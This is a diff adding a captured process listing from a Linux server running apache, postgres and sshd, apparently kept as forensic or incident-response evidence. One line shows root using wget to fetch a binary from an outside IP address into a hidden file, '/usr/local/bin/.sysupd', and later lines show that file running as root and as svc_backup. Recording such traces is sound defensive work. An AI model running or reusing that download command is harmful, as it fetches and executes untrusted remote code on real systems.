@@ -1,0 +1,15 @@
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 168432 11244 ?        Ss   Jun20   0:04 /sbin/init
+root         412  0.0  0.0  15980  6432 ?        Ss   Jun20   0:00 /lib/systemd/systemd-journald
+root         501  0.0  0.1  22344  8120 ?        Ss   Jun20   0:01 /usr/sbin/sshd -D
+root         612  0.0  0.0  98304  3520 ?        Ss   Jun20   0:00 /usr/sbin/cron -f
+postgres     701  0.1  1.2 412340 98220 ?        Sl   Jun20   4:12 /usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main
+www-data     715  0.0  0.4 210044 32112 ?        S    Jun20   0:22 /usr/sbin/apache2 -k start
+www-data     716  0.0  0.4 210044 31980 ?        S    Jun20   0:19 /usr/sbin/apache2 -k start
+deploy     10118  0.0  0.1  13120  6244 pts/0    Ss   02:03   0:00 -bash
+root       10163  0.0  0.0  10120  2340 pts/0    S    02:19   0:00 wget http://185.220.101.47:8000/sysupd -O /usr/local/bin/.sysupd
+root       10171  0.4  0.2  22540  9012 ?        Sl   02:19   0:31 /usr/local/bin/.sysupd
+svc_backup 12045  0.0  0.0   8120  1980 ?        S    07:20   0:00 /usr/local/bin/.sysupd
+root       15221  0.0  0.1  11244  4220 ?        Ss   08:01   0:00 /usr/sbin/CRON -f
+www-data   16034  0.0  0.3 208012 24012 ?        S    08:44   0:03 /usr/sbin/apache2 -k start
+root       16210  0.0  0.0   9120  2988 pts/1    R+   09:02   0:00 ps aux
